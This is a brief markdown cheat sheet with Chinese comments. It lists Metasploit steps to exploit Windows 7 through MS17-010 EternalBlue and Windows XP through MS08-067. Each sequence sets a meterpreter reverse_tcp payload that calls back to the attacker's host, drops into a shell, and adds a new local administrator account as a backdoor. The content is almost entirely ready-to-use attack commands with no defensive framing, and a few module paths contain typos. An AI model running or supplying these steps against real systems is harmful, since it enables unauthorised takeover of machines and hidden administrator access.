# win7
```
nmap 扫描445端口是否开启
search 17-010
use exploitwindows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
set rhost xxx
set lhost xxx
run
shell
net user xxxx 1234 /add(创建用户)
net localgroup administrators xxxx /add(将用户设置为管理员权限)
```

# winxp
```
search 08-067
use exploit/windwos/smb/ms08_067_netapi
set payload windows/meterpreter/reverse_tcp
show targets
set target 10(根据nmap扫描到的结果进行选择.简体中文10)
run
shell
net user xxxx 1234 /add(创建用户)
net localgroup administrators xxxx /add(将用户设置为管理员权限)
```